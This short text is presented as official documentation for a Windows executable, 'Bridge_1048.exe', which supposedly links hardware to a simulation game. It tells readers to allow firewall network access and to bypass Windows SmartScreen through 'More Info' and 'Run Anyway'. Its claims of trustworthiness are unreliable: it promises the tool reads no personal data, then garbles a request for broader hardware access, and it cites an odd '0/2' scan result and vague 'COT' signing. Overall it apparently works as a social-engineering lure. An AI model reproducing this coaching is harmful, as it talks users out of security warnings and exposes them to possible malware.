===========================================================
    BRIDGE UTILITY - OFFICIAL DOCUMENTATION (BUILD 1048)
===========================================================

[VERIFICATION STATUS]
COT: 1048-ACTIVE
INTEGRITY: SIGNED (INTERNAL)

[SYSTEM REQUIREMENTS]
OS: Windows 10 / Windows 11 (x64)
HARDWARE: 1048-Verified Bluetooth/USB Peripherals
NETWORK: Local Port 3000 Access

[INITIALIZATION GUIDE]
Upon running 'Bridge_1048.exe', Windows Firewall may prompt you to 
"Allow Network and Devices Networks." 

To synchronize your equipment with the Mini ISO simulation, you must 
select [ALLOW ACCESS]. 

[SECURITY & TRUST]
1. TRANSPARENCY: This utility is a read-only relay. It does not access 
   your personal files, browser data, or passwords, But if you want it to show more devices allow it to do hardware in this device.
2. VERIFICATION: For your peace of mind, we recommend running this 
   file through 'VirusTotal' or any standard antivirus scanner. 
   Official builds should return a 0/2 detection rate.
3. PROTOCOL: If you do not feel comfortable authorizing the relay, 
   please exit the application. Note that hardware synchronization 
   will be disabled in-game without this active bridge.

[QUICK WARNING / TROUBLESHOOTING]
Because this is a specialized developer utility, Windows SmartScreen 
may display a "Windows protected your PC" message. This is normal for 
newly compiled .exe files. 
> To bypass: Click "More Info" -> "Run Anyway."

Thank you for supporting the project and helping us maintain a 
high-performance simulation environment.

===========================================================
OFFICIAL COT 1048 BUILD | SYSTEM SYNC ACTIVE
===========================================================